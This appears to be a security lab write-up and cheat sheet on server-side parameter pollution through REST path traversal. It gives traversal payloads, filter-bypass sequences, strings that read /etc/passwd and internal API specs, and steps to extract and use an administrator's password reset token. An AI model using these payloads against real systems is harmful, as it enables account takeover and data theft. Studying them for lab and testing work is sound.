# Server-Side Parameter Pollution — REST Path

## When this applies

- Frontend forwards `username` into an internal REST URL: `internal://api/v1/users/<input>`.
- Backend constructs path by string concatenation; `/` and `..` segments aren't normalized away.
- Goal: traverse the path to a different internal route (`openapi.json`, `users/admin/field/reset_token`).

## Technique

Inject `..%2f` segments to escape the intended path. Discover the internal API surface via `openapi.json`. Then inject the right path components to reach `users/<admin>/field/<sensitive_field>`.

## Steps

### Lab — Extract password reset token via REST path traversal

**Phase 1: Behavioral Analysis**
1. Test parameter manipulation:
   - `administrator#` (`%23`) → "Invalid route"
   - `administrator?` (`%3F`) → "Invalid route"
   - `./administrator` → original response
   - `../administrator` → "Invalid route"

**Phase 2: API Discovery**
2. Progressive path traversal with `../` sequences
3. Test: `../../../../openapi.json%23`
4. Returns API structure: `/api/internal/v1/users/{username}/field/{field}`

**Phase 3: Exploitation**
5. Test field validity: `administrator/field/foo%23` → error
6. Valid field: `administrator/field/email%23` → success
7. Extract token: `../../v1/users/administrator/field/passwordResetToken%23`
8. Use token to reset password

### Key payloads

| Payload | Backend Interpretation | Result |
|---------|----------------------|--------|
| `admin%23` | `/api/.../admin#` | Invalid route |
| `..%2fadmin` | `/api/.../../admin` | Invalid route |
| `..%2f..%2f..%2f..%2fopenapi.json%23` | `/../../../../openapi.json#` | API spec |
| `..%2f..%2fv1%2fusers%2fadmin%2ffield%2fpasswordResetToken%23` | `/api/../v1/users/admin/field/passwordResetToken` | Token |

### Alternative traversal sequences

- `....//` (bypass filters)
- `..;/` (semicolon separator)
- `..\` (Windows paths)
- `%2e%2e%2f` (double encoding)

### REST path testing

```
# Path Traversal
username=../../../../etc/passwd%23
username=..%2f..%2f..%2f..%2fetc%2fpasswd%23

# API Discovery
username=../../../../openapi.json%23
username=../../../../swagger.json%23

# Version Manipulation
username=../../v1/users/admin/field/email%23
username=../../v2/users/admin/field/password%23
```

### Common API documentation paths

```
/openapi.json
/swagger.json
/api-docs
/v1/api-docs
/api/swagger.json
```

### Comparison with query-string SSPP

| Aspect | Query String | REST Path |
|--------|-------------|-----------|
| Injection Point | Query parameters | URL path segments |
| Separators | `&`, `?`, `#` | `/`, `.`, `#` |
| Discovery | Error messages | Path traversal + OpenAPI |
| Complexity | Easier | More complex |

## Verifying success

- `openapi.json` retrieval succeeds (returns full internal API spec).
- Targeted field extraction returns the sensitive value (reset token, email).
- Reset token works against the target user's password reset.

## Common pitfalls

- Some apps normalize `..` server-side — try `....//` or `..;/`.
- The number of `..` levels depends on the internal URL prefix length — start with 4 and adjust.
- Trailing `%23` truncates anything appended by the frontend (e.g., `/profile`) — required for clean traversal.

## Tools

- Burp Suite Repeater + Intruder
- ffuf (path traversal wordlist)
- Burp OpenAPI Parser BApp (load recovered spec)
- curl with `--path-as-is`
